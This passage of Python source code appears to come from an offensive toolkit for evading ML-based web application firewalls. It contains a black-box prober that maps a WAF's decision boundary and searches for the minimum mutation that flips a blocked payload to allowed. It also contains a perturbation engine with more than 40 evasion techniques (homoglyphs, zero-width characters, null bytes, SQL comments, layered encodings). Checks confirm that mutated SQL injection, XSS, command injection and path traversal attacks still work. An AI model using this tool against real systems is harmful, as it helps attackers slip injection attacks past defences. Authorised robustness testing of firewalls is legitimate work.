        # Add char distribution values in fixed order
        dist_keys = ["alpha_upper", "alpha_lower", "digit", "space", "special", "control", "high_unicode"]
        for key in dist_keys:
            raw.append(fv.char_distribution.get(key, 0.0))

        # Pad to FEATURE_DIMENSIONS
        while len(raw) < FEATURE_DIMENSIONS:
            raw.append(0.0)

        return raw[:FEATURE_DIMENSIONS]

    def estimate_feature_importance(
        self,
        blocked_payloads: List[str],
        allowed_payloads: List[str],
    ) -> Dict[str, float]:
        """
        Estimate which features the WAF ML model considers most important
        by comparing feature vectors of blocked vs allowed payloads.
        """
        with self._lock:
            if not blocked_payloads or not allowed_payloads:
                return {}

            blocked_vectors = [self.extract_features(p) for p in blocked_payloads]
            allowed_vectors = [self.extract_features(p) for p in allowed_payloads]

            importance: Dict[str, float] = {}

            # Compare mean raw vector values
            blocked_means = self._compute_vector_means(blocked_vectors)
            allowed_means = self._compute_vector_means(allowed_vectors)

            feature_names = [
                "payload_length", "string_entropy", "special_char_ratio",
                "encoding_depth", "keyword_density", "numeric_ratio",
                "uppercase_ratio", "lowercase_ratio", "whitespace_ratio",
                "printable_ratio", "max_run_length", "unique_char_count",
                "bigram_entropy", "trigram_entropy",
                "dist_alpha_upper", "dist_alpha_lower", "dist_digit",
                "dist_space", "dist_special", "dist_control", "dist_high_unicode",
            ]

            for i, name in enumerate(feature_names):
                if i < len(blocked_means) and i < len(allowed_means):
                    diff = abs(blocked_means[i] - allowed_means[i])
                    # Normalize by max value to get relative importance
                    max_val = max(abs(blocked_means[i]), abs(allowed_means[i]), EPSILON)
                    importance[name] = round(diff / max_val, 6)

            # Sort by importance
            importance = dict(sorted(importance.items(), key=lambda x: x[1], reverse=True))
            self._importance_scores = importance
            return importance

    def _compute_vector_means(self, vectors: List[FeatureVector]) -> List[float]:
        """Compute mean of raw feature vectors."""
        if not vectors:
            return [0.0] * FEATURE_DIMENSIONS
        n = len(vectors)
        means = [0.0] * FEATURE_DIMENSIONS
        for v in vectors:
            for i, val in enumerate(v.feature_vector_raw):
                if i < FEATURE_DIMENSIONS:
                    means[i] += val
        return [m / n for m in means]

    def compute_feature_delta(self, original: str, mutated: str) -> Dict[str, float]:
        """Compute the feature-space delta between original and mutated payloads."""
        orig_vec = self.extract_features(original)
        mut_vec = self.extract_features(mutated)
        delta: Dict[str, float] = {}

        feature_names = [
            "payload_length", "string_entropy", "special_char_ratio",
            "encoding_depth", "keyword_density", "numeric_ratio",
            "uppercase_ratio", "lowercase_ratio", "whitespace_ratio",
            "printable_ratio", "max_run_length", "unique_char_count",
            "bigram_entropy", "trigram_entropy",
        ]

        for i, name in enumerate(feature_names):
            if i < len(orig_vec.feature_vector_raw) and i < len(mut_vec.feature_vector_raw):
                d = mut_vec.feature_vector_raw[i] - orig_vec.feature_vector_raw[i]
                if abs(d) > EPSILON:
                    delta[name] = round(d, 6)

        return delta

    def get_dominant_features(self, vector: FeatureVector, top_n: int = 5) -> List[Tuple[str, float]]:
        """Get the most distinctive features of a payload."""
        feature_names = [
            "payload_length", "string_entropy", "special_char_ratio",
            "encoding_depth", "keyword_density", "numeric_ratio",
            "uppercase_ratio", "lowercase_ratio", "whitespace_ratio",
            "printable_ratio", "max_run_length", "unique_char_count",
            "bigram_entropy", "trigram_entropy",
        ]
        pairs: List[Tuple[str, float]] = []
        for i, name in enumerate(feature_names):
            if i < len(vector.feature_vector_raw):
                pairs.append((name, vector.feature_vector_raw[i]))
        pairs.sort(key=lambda x: abs(x[1]), reverse=True)
        return pairs[:top_n]

    def compute_cosine_similarity(self, vec_a: List[float], vec_b: List[float]) -> float:
        """Compute cosine similarity between two feature vectors."""
        if len(vec_a) != len(vec_b):
            min_len = min(len(vec_a), len(vec_b))
            vec_a = vec_a[:min_len]
            vec_b = vec_b[:min_len]
        dot = sum(a * b for a, b in zip(vec_a, vec_b))
        mag_a = math.sqrt(sum(a * a for a in vec_a))
        mag_b = math.sqrt(sum(b * b for b in vec_b))
        if mag_a < EPSILON or mag_b < EPSILON:
            return 0.0
        return round(dot / (mag_a * mag_b), 6)

    def compute_euclidean_distance(self, vec_a: List[float], vec_b: List[float]) -> float:
        """Compute Euclidean distance between two feature vectors."""
        if len(vec_a) != len(vec_b):
            min_len = min(len(vec_a), len(vec_b))
            vec_a = vec_a[:min_len]
            vec_b = vec_b[:min_len]
        return round(math.sqrt(sum((a - b) ** 2 for a, b in zip(vec_a, vec_b))), 6)

    def get_stats(self) -> Dict[str, Any]:
        """Get analyzer statistics."""
        with self._lock:
            return {
                "extraction_count": self._extraction_count,
                "cache_size": len(self._feature_cache),
                "importance_scores": dict(self._importance_scores),
            }


# ════════════════════════════════════════════════════════════════════════════════
# MLModelProber — Black-box probing to infer WAF decision boundaries
# ════════════════════════════════════════════════════════════════════════════════


class MLModelProber:
    """
    Black-box probing engine for ML-based WAF model inference.

    Sends carefully crafted payloads to observe block/allow decisions,
    infers decision boundaries, and finds minimum perturbations to flip
    classification from 'blocked' to 'allowed'.

    Usage:
        prober = MLModelProber(probe_fn=my_waf_test_function)
        boundary = prober.infer_decision_boundary(base_payload)
        min_pert = prober.find_minimum_perturbation(blocked_payload)
        model_type = prober.infer_model_type()
    """

    def __init__(
        self,
        probe_fn: Optional[Callable[[str], ProbeResult]] = None,
        feature_analyzer: Optional[FeatureAnalyzer] = None,
    ) -> None:
        self._lock = threading.RLock()
        self._probe_fn = probe_fn or self._default_probe
        self._analyzer = feature_analyzer or FeatureAnalyzer()
        self._probe_history: List[ProbeRecord] = []
        self._boundaries: List[DecisionBoundary] = []
        self._blocked_payloads: List[str] = []
        self._allowed_payloads: List[str] = []
        self._probe_count: int = 0
        self._inferred_model: str = "unknown"
        self._feature_weights: Dict[str, float] = {}
        logger.info("MLModelProber initialized")

    def _default_probe(self, payload: str) -> ProbeResult:
        """Default probe function — simulates a WAF based on heuristics."""
        features = self._analyzer.extract_features(payload)
        score = 0.0
        score += features.keyword_density * 3.0
        score += features.special_char_ratio * 2.0
        score += min(features.string_entropy / 5.0, 1.0) * 1.5
        score += min(features.encoding_depth / 3.0, 1.0) * 2.0
        if features.payload_length > 500:
            score += 0.5
        if features.keyword_density > 0.3:
            score += 2.0

        if score > 3.0:
            return ProbeResult.BLOCKED
        elif score > 2.0:
            return ProbeResult.CHALLENGED
        else:
            return ProbeResult.ALLOWED

    def probe(self, payload: str) -> ProbeRecord:
        """Send a single probe and record the result."""
        with self._lock:
            start_time = time.time()
            result = self._probe_fn(payload)
            elapsed = (time.time() - start_time) * 1000

            features = self._analyzer.extract_features(payload)

            record = ProbeRecord(
                payload=payload,
                result=result,
                response_time_ms=round(elapsed, 2),
                feature_vector=features,
            )

            self._probe_history.append(record)
            self._probe_count += 1

            if result == ProbeResult.BLOCKED:
                self._blocked_payloads.append(payload)
            elif result == ProbeResult.ALLOWED:
                self._allowed_payloads.append(payload)

            return record

    def probe_batch(self, payloads: List[str]) -> List[ProbeRecord]:
        """Probe multiple payloads sequentially."""
        results = []
        for payload in payloads[:MAX_PROBE_BATCH]:
            results.append(self.probe(payload))
        return results

    def infer_decision_boundary(
        self,
        base_payload: str,
        perturbation_steps: int = 50,
    ) -> DecisionBoundary:
        """
        Infer the decision boundary by gradually modifying a payload
        and observing where the WAF flips its decision.
        """
        with self._lock:
            logger.info("Inferring decision boundary for payload (len=%d)", len(base_payload))

            boundary = DecisionBoundary()
            boundary_probes_blocked: List[Tuple[str, FeatureVector]] = []
            boundary_probes_allowed: List[Tuple[str, FeatureVector]] = []

            # Phase 1: Test base payload
            base_record = self.probe(base_payload)
            base_blocked = base_record.result == ProbeResult.BLOCKED

            # Phase 2: Generate progressive perturbations
            perturbation_levels = self._generate_perturbation_levels(
                base_payload, perturbation_steps
            )

            for level, perturbed in perturbation_levels:
                record = self.probe(perturbed)
                features = self._analyzer.extract_features(perturbed)

                if record.result == ProbeResult.BLOCKED:
                    boundary_probes_blocked.append((perturbed, features))
                elif record.result == ProbeResult.ALLOWED:
                    boundary_probes_allowed.append((perturbed, features))

            # Phase 3: Find boundary between last blocked and first allowed
            if boundary_probes_blocked and boundary_probes_allowed:
                last_blocked = boundary_probes_blocked[-1][0]
                first_allowed = boundary_probes_allowed[0][0]

                # Binary search between the two
                refined = self._binary_search_boundary(last_blocked, first_allowed, 10)
                if refined:
                    boundary.support_vectors_blocked.append(refined[0])
                    boundary.support_vectors_allowed.append(refined[1])

            # Phase 4: Estimate feature weights
            if self._blocked_payloads and self._allowed_payloads:
                importance = self._analyzer.estimate_feature_importance(
                    self._blocked_payloads[-20:],
                    self._allowed_payloads[-20:],
                )
                boundary.feature_weights = importance

            # Phase 5: Estimate threshold and model type
            boundary.probe_count = len(self._probe_history)
            boundary.threshold = self._estimate_threshold()
            boundary.inferred_model_type = self._infer_model_type_from_probes()
            boundary.confidence = self._compute_boundary_confidence(
                boundary_probes_blocked, boundary_probes_allowed
            )
            boundary.margin = self._estimate_margin(
                boundary_probes_blocked, boundary_probes_allowed
            )

            self._boundaries.append(boundary)
            self._inferred_model = boundary.inferred_model_type
            self._feature_weights = boundary.feature_weights

            logger.info(
                "Decision boundary inferred: model=%s, threshold=%.3f, confidence=%.3f",
                boundary.inferred_model_type, boundary.threshold, boundary.confidence,
            )

            return boundary

    def _generate_perturbation_levels(
        self, payload: str, steps: int
    ) -> List[Tuple[float, str]]:
        """Generate progressively perturbed versions of a payload."""
        levels: List[Tuple[float, str]] = []
        text = payload

        for step in range(steps):
            ratio = (step + 1) / steps

            # Progressively remove attack indicators
            modified = text

            # Remove keywords proportionally
            keywords_found = re.findall(r"(?i)\b\w+\b", modified)
            all_kw = SQL_KEYWORDS | XSS_KEYWORDS | CMD_KEYWORDS
            attack_words = [w for w in keywords_found if w.lower() in all_kw]

            n_remove = int(len(attack_words) * ratio)
            for w in attack_words[:n_remove]:
                modified = re.sub(r"(?i)\b" + re.escape(w) + r"\b", "x" * len(w), modified, count=1)

            # Reduce special chars proportionally
            special_count = sum(1 for c in modified if c in self._analyzer._special_chars)
            n_replace = int(special_count * ratio)
            replaced = 0
            result_chars = list(modified)
            for i, ch in enumerate(result_chars):
                if ch in self._analyzer._special_chars and replaced < n_replace:
                    result_chars[i] = " "
                    replaced += 1
            modified = "".join(result_chars)

            levels.append((ratio, modified))

        return levels

    def _binary_search_boundary(
        self, blocked: str, allowed: str, max_iterations: int
    ) -> Optional[Tuple[str, str]]:
        """Binary search between a blocked and allowed payload to find exact boundary."""
        last_blocked = blocked
        last_allowed = allowed

        for _ in range(max_iterations):
            # Create midpoint by interpolating between the two
            mid = self._interpolate_payloads(last_blocked, last_allowed)
            if mid == last_blocked or mid == last_allowed:
                break

            record = self.probe(mid)

            if record.result == ProbeResult.BLOCKED:
                last_blocked = mid
            else:
                last_allowed = mid

        return (last_blocked, last_allowed)

    def _interpolate_payloads(self, payload_a: str, payload_b: str) -> str:
        """Create an intermediate payload between two payloads."""
        # Character-level interpolation: take half from each
        result = []
        max_len = max(len(payload_a), len(payload_b))
        a_padded = payload_a.ljust(max_len)
        b_padded = payload_b.ljust(max_len)

        for i in range(max_len):
            if i < len(payload_a) and i < len(payload_b):
                # Alternate characters, biased towards midpoint
                if i % 2 == 0:
                    result.append(a_padded[i])
                else:
                    result.append(b_padded[i])
            elif i < len(payload_a):
                result.append(a_padded[i])
            else:
                result.append(b_padded[i])

        return "".join(result).rstrip()

    def _estimate_threshold(self) -> float:
        """Estimate the WAF's classification threshold from probe history."""
        if not self._probe_history:
            return 0.5

        blocked_scores: List[float] = []
        allowed_scores: List[float] = []

        for record in self._probe_history:
            if record.feature_vector:
                score = record.feature_vector.keyword_density * 3.0 + \
                        record.feature_vector.special_char_ratio * 2.0
                if record.result == ProbeResult.BLOCKED:
                    blocked_scores.append(score)
                elif record.result == ProbeResult.ALLOWED:
                    allowed_scores.append(score)

        if blocked_scores and allowed_scores:
            min_blocked = min(blocked_scores)
            max_allowed = max(allowed_scores)
            return round((min_blocked + max_allowed) / 2.0, 4)

        return 0.5

    def _infer_model_type_from_probes(self) -> str:
        """Infer the type of ML model the WAF uses from probe behavior."""
        if len(self._probe_history) < 10:
            return "unknown"

        # Analyze response time variance — ML models have consistent times
        times = [r.response_time_ms for r in self._probe_history if r.response_time_ms > 0]
        if not times:
            return "unknown"

        mean_time = sum(times) / len(times)
        variance = sum((t - mean_time) ** 2 for t in times) / len(times)
        std_dev = math.sqrt(variance)
        cv = std_dev / max(mean_time, EPSILON)

        # Check if decision boundary is linear or non-linear
        boundary_sharpness = self._compute_boundary_sharpness()

        if cv < 0.1:
            # Very consistent times suggest batch ML inference
            if boundary_sharpness > 0.8:
                return "svm_linear"
            elif boundary_sharpness > 0.5:
                return "random_forest"
            else:
                return "neural_network"
        elif cv < 0.3:
            if boundary_sharpness > 0.7:
                return "logistic_regression"
            else:
                return "gradient_boosting"
        else:
            # High variance suggests rule-based with some ML
            return "hybrid_rule_ml"

    def _compute_boundary_sharpness(self) -> float:
        """Compute how sharp the decision boundary is (linear = sharp)."""
        if len(self._probe_history) < 5:
            return 0.5

        transitions = 0
        total = 0
        prev_result = None

        for record in self._probe_history:
            if record.result in (ProbeResult.BLOCKED, ProbeResult.ALLOWED):
                if prev_result is not None and record.result != prev_result:
                    transitions += 1
                prev_result = record.result
                total += 1

        if total < 2:
            return 0.5

        # Fewer transitions = sharper boundary = more linear
        transition_rate = transitions / (total - 1)
        return round(1.0 - transition_rate, 4)

    def _compute_boundary_confidence(
        self,
        blocked: List[Tuple[str, FeatureVector]],
        allowed: List[Tuple[str, FeatureVector]],
    ) -> float:
        """Compute confidence in the inferred boundary."""
        if not blocked or not allowed:
            return 0.0

        total_probes = len(self._probe_history)
        data_score = min(total_probes / 50.0, 1.0)

        # Separation score: how well-separated are blocked vs allowed?
        blocked_vecs = [f.feature_vector_raw for _, f in blocked]
        allowed_vecs = [f.feature_vector_raw for _, f in allowed]

        blocked_mean = self._mean_vector(blocked_vecs)
        allowed_mean = self._mean_vector(allowed_vecs)

        separation = self._analyzer.compute_euclidean_distance(blocked_mean, allowed_mean)
        sep_score = min(separation / 10.0, 1.0)

        return round((data_score * 0.5 + sep_score * 0.5), 4)

    def _estimate_margin(
        self,
        blocked: List[Tuple[str, FeatureVector]],
        allowed: List[Tuple[str, FeatureVector]],
    ) -> float:
        """Estimate the margin of the decision boundary."""
        if not blocked or not allowed:
            return 0.0

        # Find closest blocked-allowed pair
        min_dist = float("inf")
        for _, b_feat in blocked:
            for _, a_feat in allowed:
                dist = self._analyzer.compute_euclidean_distance(
                    b_feat.feature_vector_raw, a_feat.feature_vector_raw
                )
                if dist < min_dist:
                    min_dist = dist

        return round(min_dist, 6) if min_dist != float("inf") else 0.0

    def _mean_vector(self, vectors: List[List[float]]) -> List[float]:
        """Compute mean of a list of vectors."""
        if not vectors:
            return [0.0] * FEATURE_DIMENSIONS
        n = len(vectors)
        dim = len(vectors[0])
        means = [0.0] * dim
        for v in vectors:
            for i, val in enumerate(v):
                if i < dim:
                    means[i] += val
        return [m / n for m in means]

    def find_minimum_perturbation(
        self,
        blocked_payload: str,
        max_attempts: int = 100,
    ) -> Optional[AdversarialPayload]:
        """
        Find the minimum perturbation needed to flip a blocked payload
        to allowed status.
        """
        with self._lock:
            logger.info("Finding minimum perturbation for payload (len=%d)", len(blocked_payload))

            # Verify it's actually blocked
            initial = self.probe(blocked_payload)
            if initial.result != ProbeResult.BLOCKED:
                logger.warning("Payload is not blocked, no perturbation needed")
                return None

            best_payload: Optional[AdversarialPayload] = None
            min_perturbation_count = float("inf")

            # Try single perturbations first
            single_perturbations = [
                (PerturbationType.WHITESPACE_INSERT, self._perturb_whitespace),
                (PerturbationType.SQL_COMMENT_INLINE, self._perturb_sql_comment),
                (PerturbationType.CASE_ALTERNATE, self._perturb_case_alternate),
                (PerturbationType.URL_ENCODE_SINGLE, self._perturb_url_encode),
                (PerturbationType.ZERO_WIDTH_SPACE, self._perturb_zero_width),
                (PerturbationType.HOMOGLYPH_CYRILLIC, self._perturb_homoglyph),
                (PerturbationType.UNICODE_FULLWIDTH, self._perturb_fullwidth),
                (PerturbationType.NULL_BYTE, self._perturb_null_byte),
            ]

            for pert_type, pert_fn in single_perturbations:
                perturbed = pert_fn(blocked_payload)
                record = self.probe(perturbed)

                if record.result == ProbeResult.ALLOWED:
                    adv = AdversarialPayload(
                        original_payload=blocked_payload,
                        mutated_payload=perturbed,
                        perturbations_applied=[pert_type.name],
                        perturbation_types=[pert_type],
                        evasion_success=True,
                        confidence=0.9,
                    )
                    if 1 < min_perturbation_count:
                        min_perturbation_count = 1
                        best_payload = adv

            # If single didn't work, try combinations
            if best_payload is None:
                for attempt in range(min(max_attempts, 50)):
                    n_perts = random.randint(2, 4)
                    selected = random.sample(single_perturbations, min(n_perts, len(single_perturbations)))

                    current = blocked_payload
                    applied: List[str] = []
                    types: List[PerturbationType] = []
                    for pert_type, pert_fn in selected:
                        current = pert_fn(current)
                        applied.append(pert_type.name)
                        types.append(pert_type)

                    record = self.probe(current)
                    if record.result == ProbeResult.ALLOWED:
                        if len(applied) < min_perturbation_count:
                            min_perturbation_count = len(applied)
                            best_payload = AdversarialPayload(
                                original_payload=blocked_payload,
                                mutated_payload=current,
                                perturbations_applied=applied,
                                perturbation_types=types,
                                evasion_success=True,
                                confidence=0.8,
                            )

            if best_payload:
                logger.info(
                    "Minimum perturbation found: %d modifications",
                    len(best_payload.perturbations_applied),
                )
            else:
                logger.info("No evasion found within %d attempts", max_attempts)

            return best_payload

    # --- Simple perturbation helpers for probing ---

    def _perturb_whitespace(self, payload: str) -> str:
        """Insert whitespace between tokens."""
        return re.sub(r"(\w)(\W)", r"\1 \2", payload)

    def _perturb_sql_comment(self, payload: str) -> str:
        """Insert SQL inline comments between keywords."""
        return re.sub(r"(?i)\b(SELECT|UNION|FROM|WHERE|AND|OR)\b", r"/**/\1/**/", payload)

    def _perturb_case_alternate(self, payload: str) -> str:
        """Alternate character case."""
        result = []
        for i, ch in enumerate(payload):
            if i % 2 == 0:
                result.append(ch.upper())
            else:
                result.append(ch.lower())
        return "".join(result)

    def _perturb_url_encode(self, payload: str) -> str:
        """URL-encode special characters."""
        result = []
        for ch in payload:
            if ch in "'\";=()&|<>":
                result.append(f"%{ord(ch):02X}")
            else:
                result.append(ch)
        return "".join(result)

    def _perturb_zero_width(self, payload: str) -> str:
        """Insert zero-width characters between keyword characters."""
        zwsp = "\u200b"
        keywords = list(SQL_KEYWORDS | XSS_KEYWORDS)
        result = payload
        for kw in keywords[:10]:
            if kw.lower() in result.lower():
                broken = zwsp.join(kw)
                result = re.sub(re.escape(kw), broken, result, flags=re.IGNORECASE, count=1)
        return result

    def _perturb_homoglyph(self, payload: str) -> str:
        """Replace characters with homoglyphs."""
        result = list(payload)
        for i, ch in enumerate(result):
            if ch in HOMOGLYPH_MAP and random.random() < 0.3:
                result[i] = random.choice(HOMOGLYPH_MAP[ch])
        return "".join(result)

    def _perturb_fullwidth(self, payload: str) -> str:
        """Convert ASCII to fullwidth Unicode."""
        result = []
        for ch in payload:
            cp = ord(ch)
            if 0x21 <= cp <= 0x7E and random.random() < 0.3:
                result.append(chr(cp + FULLWIDTH_OFFSET))
            else:
                result.append(ch)
        return "".join(result)

    def _perturb_null_byte(self, payload: str) -> str:
        """Insert null bytes before keywords."""
        result = payload
        for kw in list(SQL_KEYWORDS)[:5]:
            result = re.sub(
                r"(?i)\b(" + re.escape(kw) + r")",
                r"\x00\1",
                result,
                count=1,
            )
        return result

    def infer_model_type(self) -> str:
        """Return the inferred model type based on probing data."""
        with self._lock:
            return self._inferred_model

    def get_probe_stats(self) -> Dict[str, Any]:
        """Get probing statistics."""
        with self._lock:
            blocked = sum(1 for r in self._probe_history if r.result == ProbeResult.BLOCKED)
            allowed = sum(1 for r in self._probe_history if r.result == ProbeResult.ALLOWED)
            challenged = sum(1 for r in self._probe_history if r.result == ProbeResult.CHALLENGED)

            return {
                "total_probes": self._probe_count,
                "blocked": blocked,
                "allowed": allowed,
                "challenged": challenged,
                "block_rate": round(blocked / max(self._probe_count, 1), 4),
                "inferred_model": self._inferred_model,
                "boundaries_found": len(self._boundaries),
                "feature_weights": dict(self._feature_weights),
            }


# ════════════════════════════════════════════════════════════════════════════════
# PerturbationEngine — 40+ adversarial perturbation techniques
# ════════════════════════════════════════════════════════════════════════════════


class PerturbationEngine:
    """
    Engine for applying adversarial perturbations to payloads.

    Implements 40+ perturbation techniques including whitespace insertion,
    comment injection, case alternation, encoding substitution, null byte
    insertion, unicode normalization variants, homoglyph substitution,
    zero-width character insertion, string concatenation splitting,
    numeric representation changes, HTML entity mixing, URL encoding
    layers, and semantic preservation verification.

    Usage:
        engine = PerturbationEngine()
        perturbed = engine.apply(payload, PerturbationType.HOMOGLYPH_CYRILLIC)
        batch = engine.apply_random(payload, count=5)
        valid = engine.verify_semantic_preservation(original, perturbed, context)
    """

    def __init__(self, feature_analyzer: Optional[FeatureAnalyzer] = None) -> None:
        self._lock = threading.RLock()
        self._analyzer = feature_analyzer or FeatureAnalyzer()
        self._perturbation_count: int = 0
        self._success_rates: Dict[str, List[bool]] = defaultdict(list)
        self._technique_registry: Dict[PerturbationType, Callable[[str], str]] = {}
        self._register_techniques()
        logger.info("PerturbationEngine initialized with %d techniques", len(self._technique_registry))

    def _register_techniques(self) -> None:
        """Register all perturbation techniques."""
        self._technique_registry = {
            # Whitespace perturbations
            PerturbationType.WHITESPACE_INSERT: self._whitespace_insert,
            PerturbationType.TAB_INSERT: self._tab_insert,
            PerturbationType.NEWLINE_INSERT: self._newline_insert,
            # Comment injection
            PerturbationType.SQL_COMMENT_INLINE: self._sql_comment_inline,
            PerturbationType.SQL_COMMENT_BLOCK: self._sql_comment_block,
            PerturbationType.HTML_COMMENT_INJECT: self._html_comment_inject,
            PerturbationType.CSS_COMMENT_INJECT: self._css_comment_inject,
            PerturbationType.JS_COMMENT_INJECT: self._js_comment_inject,
            # Case alternation
            PerturbationType.CASE_UPPER: self._case_upper,
            PerturbationType.CASE_LOWER: self._case_lower,
            PerturbationType.CASE_ALTERNATE: self._case_alternate,
            PerturbationType.CASE_RANDOM: self._case_random,
            # URL encoding
            PerturbationType.URL_ENCODE_SINGLE: self._url_encode_single,
            PerturbationType.URL_ENCODE_DOUBLE: self._url_encode_double,
            PerturbationType.URL_ENCODE_TRIPLE: self._url_encode_triple,
            # HTML entities
            PerturbationType.HTML_ENTITY_DECIMAL: self._html_entity_decimal,
            PerturbationType.HTML_ENTITY_HEX: self._html_entity_hex,
            PerturbationType.HTML_ENTITY_NAMED: self._html_entity_named,
            # Unicode variants
            PerturbationType.UNICODE_FULLWIDTH: self._unicode_fullwidth,
            PerturbationType.UNICODE_HALFWIDTH: self._unicode_halfwidth,
            PerturbationType.UNICODE_SUPERSCRIPT: self._unicode_superscript,
            PerturbationType.UNICODE_SUBSCRIPT: self._unicode_subscript,
            PerturbationType.UNICODE_COMBINING: self._unicode_combining,
            # Homoglyphs
            PerturbationType.HOMOGLYPH_CYRILLIC: self._homoglyph_cyrillic,
            PerturbationType.HOMOGLYPH_GREEK: self._homoglyph_greek,
            PerturbationType.HOMOGLYPH_MATH: self._homoglyph_math,
            # Zero-width
            PerturbationType.ZERO_WIDTH_SPACE: self._zero_width_space,
            PerturbationType.ZERO_WIDTH_JOINER: self._zero_width_joiner,
            PerturbationType.ZERO_WIDTH_NON_JOINER: self._zero_width_non_joiner,
            # Byte-level
            PerturbationType.NULL_BYTE: self._null_byte,
            PerturbationType.BACKSPACE_CHAR: self._backspace_char,
            # String manipulation
            PerturbationType.STRING_CONCAT_SPLIT: self._string_concat_split,
            PerturbationType.CHAR_CODE_CONSTRUCT: self._char_code_construct,
            # Numeric representations
            PerturbationType.HEX_REPRESENTATION: self._hex_representation,
            PerturbationType.OCTAL_REPRESENTATION: self._octal_representation,
            # Encoding layers
            PerturbationType.BASE64_ENCODE: self._base64_encode,
            PerturbationType.UTF7_ENCODE: self._utf7_encode,
            PerturbationType.OVERLONG_UTF8: self._overlong_utf8,
            # Protocol-level
            PerturbationType.PARAMETER_POLLUTION: self._parameter_pollution,
            PerturbationType.CHUNK_TRANSFER: self._chunk_transfer,
            PerturbationType.MULTIPART_BOUNDARY: self._multipart_boundary,
            # JSON/data
            PerturbationType.JSON_UNICODE_ESCAPE: self._json_unicode_escape,
            PerturbationType.NUMERIC_CHAR_REF: self._numeric_char_ref,
            # Semantic
            PerturbationType.SEMANTIC_SYNONYM: self._semantic_synonym,
            PerturbationType.FUNCTION_ALIAS: self._function_alias,
            PerturbationType.OPERATOR_SUBSTITUTE: self._operator_substitute,
        }

    def apply(self, payload: str, perturbation: PerturbationType) -> str:
        """Apply a specific perturbation technique to a payload."""
        with self._lock:
            fn = self._technique_registry.get(perturbation)
            if fn is None:
                logger.warning("Unknown perturbation type: %s", perturbation.name)
                return payload
            result = fn(payload)
            self._perturbation_count += 1
            return result

    def apply_multiple(
        self, payload: str, perturbations: List[PerturbationType]
    ) -> str:
        """Apply multiple perturbations sequentially."""
        current = payload
        for pert in perturbations:
            current = self.apply(current, pert)
        return current

    def apply_random(
        self, payload: str, count: int = 1, exclude: Optional[Set[PerturbationType]] = None
    ) -> List[Tuple[PerturbationType, str]]:
        """Apply random perturbations and return results."""
        with self._lock:
            available = list(self._technique_registry.keys())
            if exclude:
                available = [p for p in available if p not in exclude]

            results: List[Tuple[PerturbationType, str]] = []
            selected = random.sample(available, min(count, len(available)))

            for pert in selected:
                perturbed = self.apply(payload, pert)
                results.append((pert, perturbed))

            return results

    def apply_all(self, payload: str) -> Dict[PerturbationType, str]:
        """Apply every registered perturbation and return all results."""
        with self._lock:
            results: Dict[PerturbationType, str] = {}
            for pert_type, fn in self._technique_registry.items():
                try:
                    results[pert_type] = fn(payload)
                except Exception as e:
                    logger.debug("Perturbation %s failed: %s", pert_type.name, e)
                    results[pert_type] = payload
            return results

    def get_all_techniques(self) -> List[PerturbationType]:
        """Return list of all registered perturbation types."""
        return list(self._technique_registry.keys())

    def verify_semantic_preservation(
        self,
        original: str,
        perturbed: str,
        context: PayloadContext = PayloadContext.GENERIC,
    ) -> bool:
        """
        Verify that the perturbed payload preserves the semantic meaning
        of the original (i.e., the attack would still work if executed).
        """
        with self._lock:
            if context == PayloadContext.SQL_INJECTION:
                return self._verify_sql_semantics(original, perturbed)
            elif context in (PayloadContext.XSS_REFLECTED, PayloadContext.XSS_STORED):
                return self._verify_xss_semantics(original, perturbed)
            elif context == PayloadContext.COMMAND_INJECTION:
                return self._verify_cmd_semantics(original, perturbed)
            elif context == PayloadContext.PATH_TRAVERSAL:
                return self._verify_path_semantics(original, perturbed)
            else:
                return self._verify_generic_semantics(original, perturbed)

    def _verify_sql_semantics(self, original: str, perturbed: str) -> bool:
        """Verify SQL injection semantic preservation."""
        # Strip whitespace, comments, case differences
        def normalize_sql(s: str) -> str:
            s = re.sub(r"/\*.*?\*/", " ", s, flags=re.DOTALL)
            s = re.sub(r"--.*$", "", s, flags=re.MULTILINE)
            s = re.sub(r"\s+", " ", s).strip().lower()
            # Remove zero-width characters
            for zwc in ZERO_WIDTH_CHARS:
                s = s.replace(zwc, "")
            return s

        norm_orig = normalize_sql(original)
        norm_pert = normalize_sql(perturbed)

        # Check that key SQL keywords are preserved
        orig_keywords = set(re.findall(r"\b(?:" + "|".join(SQL_KEYWORDS) + r")\b", norm_orig, re.IGNORECASE))
        pert_keywords = set(re.findall(r"\b(?:" + "|".join(SQL_KEYWORDS) + r")\b", norm_pert, re.IGNORECASE))

        # At least 70% of original keywords should be present
        if orig_keywords:
            overlap = len(orig_keywords & pert_keywords) / len(orig_keywords)
            return overlap >= 0.7
        return True

    def _verify_xss_semantics(self, original: str, perturbed: str) -> bool:
        """Verify XSS semantic preservation."""
        # Check for presence of execution triggers
        triggers = [
            r"<\s*script", r"on\w+\s*=", r"javascript\s*:",
            r"eval\s*\(", r"alert\s*\(", r"document\.",
            r"<\s*img", r"<\s*svg", r"<\s*iframe",
        ]
        orig_triggers = sum(1 for t in triggers if re.search(t, original, re.IGNORECASE))
        pert_triggers = sum(1 for t in triggers if re.search(t, perturbed, re.IGNORECASE))

        if orig_triggers == 0:
            return True
        return pert_triggers >= orig_triggers * 0.5

    def _verify_cmd_semantics(self, original: str, perturbed: str) -> bool:
        """Verify command injection semantic preservation."""
        # Check command separators and key commands
        separators = [";", "|", "&&", "||", "`", "$("]
        orig_seps = sum(1 for s in separators if s in original)
        pert_seps = sum(1 for s in separators if s in perturbed)

        orig_cmds = set(re.findall(r"\b(" + "|".join(CMD_KEYWORDS) + r")\b", original, re.IGNORECASE))
        pert_cmds = set(re.findall(r"\b(" + "|".join(CMD_KEYWORDS) + r")\b", perturbed, re.IGNORECASE))

        sep_ok = pert_seps >= orig_seps * 0.5 if orig_seps > 0 else True
        cmd_ok = len(pert_cmds) >= len(orig_cmds) * 0.5 if orig_cmds else True

        return sep_ok and cmd_ok

    def _verify_path_semantics(self, original: str, perturbed: str) -> bool:
        """Verify path traversal semantic preservation."""
        orig_traversals = original.count("../") + original.count("..\\")
        pert_traversals = perturbed.count("../") + perturbed.count("..\\")
        # Also count encoded variants
        pert_traversals += perturbed.lower().count("%2e%2e%2f")
        pert_traversals += perturbed.lower().count("%2e%2e/")
        pert_traversals += perturbed.lower().count("..%2f")

        if orig_traversals == 0:
            return True
        return pert_traversals >= orig_traversals * 0.5

    def _verify_generic_semantics(self, original: str, perturbed: str) -> bool:
        """Generic semantic preservation check using structural similarity."""
        # Strip all whitespace and zero-width chars for comparison
        def clean(s: str) -> str:
            for zwc in ZERO_WIDTH_CHARS:
                s = s.replace(zwc, "")
            s = re.sub(r"\s+", "", s)
            s = re.sub(r"/\*.*?\*/", "", s, flags=re.DOTALL)
